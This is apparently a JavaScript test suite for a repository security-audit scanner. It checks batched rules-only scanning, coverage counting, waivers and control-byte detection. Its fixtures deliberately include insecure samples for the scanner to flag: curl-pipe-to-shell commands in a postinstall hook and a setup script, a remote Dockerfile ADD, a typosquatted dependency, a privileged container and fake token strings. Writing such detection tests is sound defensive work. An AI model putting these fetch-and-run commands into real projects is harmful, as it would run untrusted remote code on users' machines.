'use strict';

/*
 * Whole-branch coverage. The traced analysis reads a prioritised set of files
 * within a budget; every eligible file past it is read a batch at a time and
 * checked against every per-file rule. What this proves:
 *
 *   - splitting a branch that way finds exactly what one pass over all of it
 *     finds, for every rule that does not need a trace -- same rules, same
 *     places, same identities, same waivers;
 *   - what the repository does right is still seen in a file past the budget;
 *   - the reads are batched within their bounds, reported as a stage, and
 *     counted honestly in coverage, including when a reader has no batch read;
 *   - the rules run the same on a worker as in process;
 *   - and no source file carries a stray control byte, which is how six
 *     patterns once went blind: a `\b` written as a backspace.
 */

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const audit = require('../src/code-audit');
const { scanOffThread } = require('../src/code-audit-worker');

/* A token-shaped fixture, built in pieces so no scanner mistakes it for a leak. */
const TOKEN = `gh${'p'}_${'A'.repeat(36)}`;

const FILES = [
  { path: 'package.json', text: JSON.stringify({ name: 'demo', scripts: { postinstall: 'curl https://x.example/i.sh | sh' }, dependencies: { expres: '^1.0.0' } }, null, 2) },
  { path: 'src/server.js', text: "const helmet = require('helmet');\napp.use(helmet());\n" },
  { path: 'deploy/Dockerfile', text: 'FROM node:latest\nUSER root\nADD https://example.test/tool.tgz /opt/\n' },
  { path: 'infra/main.tf', text: 'resource "aws_s3_bucket" "b" {\n  acl = "public-read"\n}\n' },
  { path: 'k8s/deploy.yaml', text: 'apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: a\n      securityContext:\n        privileged: true\n' },
  { path: 'scripts/setup.sh', text: `curl -fsSL https://get.example.com | bash\nexport AWS_ACCESS_KEY_ID=${TOKEN}\n` },
  { path: 'config/settings.py', text: `DEBUG = True\nAWS_KEY = "${TOKEN}"\n` },
  { path: 'lib/auth.js', text: "const bcrypt = require('bcrypt');\nconst csrf = require('csurf');\n" },
  { path: 'lib/waived.js', text: `// nv-audit-ignore SCR-001 -- a published example key, not a credential\nconst key = "${TOKEN}";\n` },
  { path: 'README.md', text: '# demo\n' }
];
const PATHS = FILES.map(file => file.path);
const untracedKey = finding => `${finding.id}|${finding.rule}|${finding.path}|${finding.line}|${finding.severity}`;

/* ---- A split pass finds what one pass finds ------------------------------------ */
{
  const whole = audit.analyse({ files: FILES, paths: PATHS });
  const primary = FILES.slice(0, 3);
  const rest = FILES.slice(3);
  const extra = audit.mergeScans(audit.scanRules(rest.slice(0, 3)), audit.scanRules(rest.slice(3)));
  const split = audit.analyse({ files: primary, paths: PATHS, extra });
  const untraced = result => result.findings.filter(finding => finding.evidence !== 'traced' && finding.evidence !== 'surface').map(untracedKey).sort();
  assert(whole.findings.length >= 6, `the fixture must fire rules: ${whole.findings.map(f => f.rule).join(',')}`);
  assert.deepStrictEqual(untraced(split), untraced(whole), 'the same findings, in the same places, with the same identities');
  assert(whole.suppressed.length >= 1, 'the fixture must carry a waiver');
  assert.deepStrictEqual(split.suppressed.map(item => `${item.rule}|${item.path}|${item.line}`), whole.suppressed.map(item => `${item.rule}|${item.path}|${item.line}`),
    'a waiver past the budget is honoured, read while its file was at hand');
  assert.strictEqual(split.score, whole.score);
  assert.strictEqual(split.grade, whole.grade);
  assert.strictEqual(split.engine.traced.rulesOnly, rest.length);
  /* What the repository does right, seen past the budget too. */
  assert.deepStrictEqual(split.controls.map(control => control.id).sort(), whole.controls.map(control => control.id).sort());
  for (const id of ['headers', 'password-hash', 'csrf']) assert(split.controls.some(control => control.id === id), `${id} is recognised`);
  /* Nothing that crosses from a rules-only batch carries text. */
  const crossing = JSON.stringify(audit.scanRules(FILES));
  assert(!crossing.includes(TOKEN) && !crossing.includes('helmet()') && !crossing.includes('public-read'), 'rules, places and flags only');
}

/* ---- The ledger says which files were only ruled ------------------------------ */
{
  const primary = [{ path: 'src/a.js', text: 'const x = req.query.id;\n' }];
  const extra = audit.scanRules([{ path: 'src/b.js', text: 'module.exports = 1;\n' }, { path: 'src/c.py', text: 'x = 1\n' }]);
  const result = audit.analyse({ files: primary, paths: ['src/a.js', 'src/b.js', 'src/c.py'], extra });
  const code = result.ledger.find(entry => entry.id === 'injection') || result.ledger.find(entry => /Traced across/.test(entry.detail || ''));
  assert(code && /2 more files beyond the traced set were checked against the rules/.test(code.detail), code && code.detail);
}

/* ---- The whole audit: batches within their bounds, counted honestly ------------ */
(async () => {
  const entries = [];
  const texts = new Map();
  for (let index = 0; index < 23; index += 1) {
    const filePath = `src/module-${String(index).padStart(2, '0')}.js`;
    const text = index === 17 ? `const key = "${TOKEN}";\n` : `module.exports = ${index};\n`;
    texts.set(filePath, text);
    entries.push({ path: filePath, sha: String(index).padStart(40, '0'), size: text.length });
  }
  texts.set('package.json', '{"name":"demo"}');
  entries.push({ path: 'package.json', sha: 'f'.repeat(40), size: 15 });
  const bySha = new Map(entries.map(entry => [entry.sha, entry.path]));
  const queries = [];
  const reader = {
    MAX_TEXTS_PER_QUERY: 5,
    resolveCommit: async ({ ref }) => ({ ref, commitSha: 'c'.repeat(40) }),
    readTree: async () => ({ truncated: false, skipped: [], entries }),
    readBlob: async ({ sha }) => ({ text: texts.get(bySha.get(sha)) }),
    readBlobTexts: async ({ paths, transport }) => {
      queries.push(paths.slice());
      assert.strictEqual(typeof transport, 'function', 'the query transport is what reaches the provider');
      /* One file the provider will not give back as text. */
      return new Map(paths.map(filePath => [filePath, filePath === 'src/module-10.js' ? { text: null, skip: 'binary' } : { text: texts.get(filePath), skip: null }]));
    }
  };
  const stages = [];
  const limits = { ...audit.LIMITS, maxFiles: 4, maxOverflowFiles: 15, queryBatchBytes: 60, scanBatchBytes: 40 };
  const scans = [];
  const result = await audit.auditRepository({
    reader, scope: { provider: 'github', owner: 'o', repo: 'r' }, ref: 'main', token: 't', transport: null,
    queryTransport: async () => ({ statusCode: 200, body: '{}' }), limits,
    scanner: async input => { scans.push(input.files.length); return audit.scanRules(input.files); },
    onProgress: update => stages.push(update)
  });
  assert(queries.every(batch => batch.length <= 5), 'at most the reader’s batch size per request');
  assert.strictEqual(queries.flat().length, 15, 'the overflow ceiling holds');
  assert(queries.length > 3, 'batched by bytes as well as by count');
  assert(scans.length >= 2, 'checked in batches, each dropped before the next');
  assert.deepStrictEqual(
    { read: result.coverage.read, rulesOnly: result.coverage.rulesOnly, unreadable: result.coverage.unreadable, budget: result.coverage.skipped.budget, complete: result.coverage.complete },
    { read: 4 + 14, rulesOnly: 14, unreadable: 1, budget: 24 - 4 - 15, complete: false }
  );
  assert(result.findings.some(finding => finding.path === 'src/module-17.js'), 'a finding past the traced set is reported');
  const rules = stages.filter(update => update.stage === 'rules');
  assert.deepStrictEqual([rules[0].done, rules.at(-1).done, rules.at(-1).total], [0, 15, 15], 'the stage counts its way through');

  /* A reader with no batch read leaves the rest unread, and says so. */
  const plain = { ...reader, readBlobTexts: undefined };
  const narrow = await audit.auditRepository({ reader: plain, scope: { provider: 'gitlab', owner: 'o', repo: 'r' }, ref: 'main', token: 't', transport: null, queryTransport: async () => ({}), limits });
  assert.deepStrictEqual([narrow.coverage.read, narrow.coverage.rulesOnly, narrow.coverage.skipped.budget], [4, 0, 20]);

  /* A request that fails outright is asked again in halves: an answer over the size bound is the usual cause. */
  {
    const sizes = [];
    const splitting = {
      ...reader,
      readBlobTexts: async ({ paths }) => {
        sizes.push(paths.length);
        if (paths.length > 2) { const failed = new Map(paths.map(filePath => [filePath, { text: null, skip: 'unreadable' }])); failed.failed = true; return failed; }
        return new Map(paths.map(filePath => [filePath, { text: texts.get(filePath), skip: null }]));
      }
    };
    const halved = await audit.auditRepository({
      reader: splitting, scope: { provider: 'github', owner: 'o', repo: 'r' }, ref: 'main', token: 't', transport: null,
      queryTransport: async () => ({}), limits: { ...limits, maxOverflowFiles: 5, queryBatchBytes: 10000 }
    });
    assert.deepStrictEqual(sizes, [5, 3, 2, 2, 1], 'five, then three and two, then the three as two and one');
    assert.deepStrictEqual([halved.coverage.rulesOnly, halved.coverage.unreadable], [5, 0]);
  }

  /* A batch the server could not check is unread, never clean. */
  const failing = await audit.auditRepository({
    reader, scope: { provider: 'github', owner: 'o', repo: 'r' }, ref: 'main', token: 't', transport: null,
    queryTransport: async () => ({}), limits, scanner: async () => { throw new Error('limit'); }
  });
  assert.strictEqual(failing.coverage.rulesOnly, 0);
  assert.strictEqual(failing.coverage.unreadable, 15);

  /* The same rules on a worker as in process. */
  const off = await scanOffThread({ files: FILES });
  const inProcess = audit.scanRules(FILES);
  assert.deepStrictEqual(off.raw.map(item => `${item.rule}|${item.path}|${item.line}|${item.suppression ? 'waived' : ''}`),
    inProcess.raw.map(item => `${item.rule}|${item.path}|${item.line}|${item.suppression ? 'waived' : ''}`));
  assert.deepStrictEqual(off.controls, inProcess.controls);

  /* ---- No stray control bytes in the code that ships ---------------------------- */
  const root = path.join(__dirname, '..');
  const shipped = [
    ...fs.readdirSync(path.join(root, 'src')).filter(name => name.endsWith('.js')).map(name => path.join('src', name)),
    ...fs.readdirSync(path.join(root, 'public')).filter(name => /\.(js|css|html)$/.test(name)).map(name => path.join('public', name)),
    'server.js'
  ];
  for (const file of shipped) {
    const text = fs.readFileSync(path.join(root, file), 'latin1');
    const stray = /[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/.exec(text);
    assert(!stray, `${file} carries control byte 0x${stray && stray[0].charCodeAt(0).toString(16)} at offset ${stray && stray.index}`);
  }

  console.log('code audit coverage tests passed');
})().catch(error => {
  console.error(error && error.stack || error);
  process.exit(1);
});
